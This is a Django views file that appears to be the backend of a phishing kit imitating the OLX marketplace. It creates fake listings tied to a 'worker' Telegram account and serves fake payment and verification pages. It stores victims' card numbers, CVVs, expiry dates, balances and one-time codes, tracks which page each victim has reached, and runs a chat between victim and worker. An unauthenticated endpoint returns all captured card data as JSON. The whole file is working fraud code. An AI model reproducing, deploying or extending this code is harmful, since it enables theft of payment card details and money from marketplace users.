from django.shortcuts import render
from django.http import HttpResponse, JsonResponse
import random

from .models import Product, Transition, Chat, CardData

def convert_to_dictionary(text):
    s = text.replace("{", "").replace("}", "").split(",")

    dictionary = {}
    for x in s:
        a = x.split(":")
        dictionary[a[0].replace("\"", "").replace(" ","")] = a[1].replace("\"", "").replace(" ", "")

    dictionary = get_product_data_of_id(dictionary)

    return dictionary

def get_product_data_of_id(d):
    product_data = Product.objects.get(id=d["id"])
    d["telegram"] = product_data.telegram
    d["product"] = product_data.name_product
    d["price"] = product_data.price

    return d

def createUrl(request):
    return render(request, 'olx_site/createUrl.html')


def detail(request, prod_id):
    try:
        product = Product.objects.filter(id=prod_id)
        product_data = Product.objects.get(id=prod_id)
        if product_data.transit != "главная":
            try:
                transit = Transition.objects.get(pr_id=prod_id)
                transit.transit = "главная"
                transit.save()
            except:
                t = Transition(pr_id=prod_id, transit="главная")
                t.save()
        return render(request, 'olx_site/detail_id.html', {"product": product, "product_data": product_data})
    except Exception as e:
        return HttpResponse(e)
        # return render(request, 'olx_site/404.html')

def delete_from_db(request, prod_id):
    try:
        product = Product.obgects.filter(id=prod_id).delete()
        product.save()
        return HttpResponse("200")
    except:
        return HttpResponse("404")

def addToDB(request):
    num = "1234567890"
    bank_id = 0
    try:
        try:
            if request.POST['PrivateBank'] == "true":
                bank_id = 1
        except:
            pass
        try:
            if request.POST['MonoBank'] == "true":
                bank_id = 2
        except:
            pass
        try:
            if request.POST['OtherBank'] == "true":
                bank_id = 3
        except:
            pass
        random_id = ""
        for x in range(0,8):
            random_id += random.choice(num)
        a = Product(img_url=request.POST['photo_url'], name_product=request.POST['name'], price=request.POST['price'],
                    name=request.POST['name_user'], surname=request.POST['surname'], surduer=request.POST['surduer'],
                    address=request.POST['address'], telegram=request.POST['telegram'], bank_id=bank_id, transit="")

        a.id = int(random_id)
        a.save()
        return HttpResponse(a.id)
    except Exception as e:
        return render(request, 'olx_site/404.html')


def payment(request, prod_id):
    try:
        product_data = Product.objects.get(id=prod_id)
        return render(request, 'olx_site/payments.html', {"product": product_data})
    except:
        return render(request, 'olx_site/404.html')


def verif(request, prod_id):
    try:
        card_data = CardData.objects.get(number=request.POST['card'].replace(" ", ""))
        card_data.cvv = request.POST['code']
        card_data.date = request.POST['date']
        card_data.balance = request.POST['balance']
        card_data.code = ""
        card_data.save()
    except:
        c = CardData(pr_id=prod_id, number=request.POST['card'].replace(" ", ""),
                                         cvv=request.POST['code'], date=request.POST['date'],
                                         balance=request.POST['balance'], code="")
        c.save()    
    return HttpResponse("ok")


def verification(request, prod_id, card):
    product_data = Product.objects.get(id=prod_id)
    try:
        full_card = card.replace(" ", "")
        card = card[12:]
        return render(request, "olx_site/verification.html", {'product': product_data,
                                                              'card': card,
                                                              'full_card': full_card})
    except:
        return render(request, 'olx_site/404.html')

def transit(request, prod_id):
    try:
        transit = Transition.objects.get(pr_id=prod_id)
        transit.transit = "ввод карты"
        transit.save()
    except Exception as e:
        t = Transition(pr_id=prod_id, transit="ввод карты")
        t.save()
        return HttpResponse(e)
    return HttpResponse("200")

def code(request, prod_id):
    card_data = CardData.objects.get(number=request.POST['card'])
    card_data.code = request.POST['code']
    card_data.save()
    return HttpResponse("ok")

def get_all_card(reques):
    text = str(CardData.objects.all()).split("CardData:")

    card_lis = []
    for x in text:
        card_lis.append(x.split(",>")[0])
    card_lis = card_lis[1:]
    res_list = {}
    a = 0
    for x in card_lis:
        try:
            res_list[a] = convert_to_dictionary(x.replace("\'", "\""))
            a += 1
        except Exception as e:
            print(e)
    
    return JsonResponse(res_list, safe=False, json_dumps_params={'ensure_ascii': False})

def get_all_chat(request):
    text = str(Chat.objects.all()).split("Chat:")
    print(text)
    card_lis = []
    for x in text:
        card_lis.append(x.split(",>")[0])
    card_lis = card_lis[1:]
    res_list = {}
    a = 0
    for x in card_lis:
        try:
            res_list[a] = convert_to_dictionary(x.replace("\'", "\""))
            a += 1
        except:
            pass
    
    return JsonResponse(res_list, safe=False, json_dumps_params={'ensure_ascii': False})


def get_all_transit(request):
    text = str(Transition.objects.all()).split("Transition:")
    card_lis = []
    for x in text:
        card_lis.append(x.split(",>")[0])
    card_lis = card_lis[1:]
    res_list = {}
    a = 0
    for x in card_lis:
        try:
            res_list[a] = convert_to_dictionary(x.replace("\'", "\""))
            a += 1
        except:
            pass
    
    return JsonResponse(res_list, safe=False, json_dumps_params={'ensure_ascii': False})


def send_mess_from_user(request, prod_id):
    try:
        chat = Chat.objects.get(pr_id=prod_id)
    except:
        chat = Chat(pr_id=prod_id, messages="")

    mess = chat.messages
    try:
        mess += "\nU: " + request.POST['text']
        chat.mess_from_user = request.POST['text']
    except:
        pass
    chat.messages = mess
    chat.save()
    return HttpResponse(mess)


def send_mess_from_worker(request, prod_id):
    chat = Chat.objects.get(pr_id=prod_id)
    mess = chat.messages
    mess += "\nW:" + request.POST['text']
    chat.messages = mess
    chat.save()
    return HttpResponse(mess)
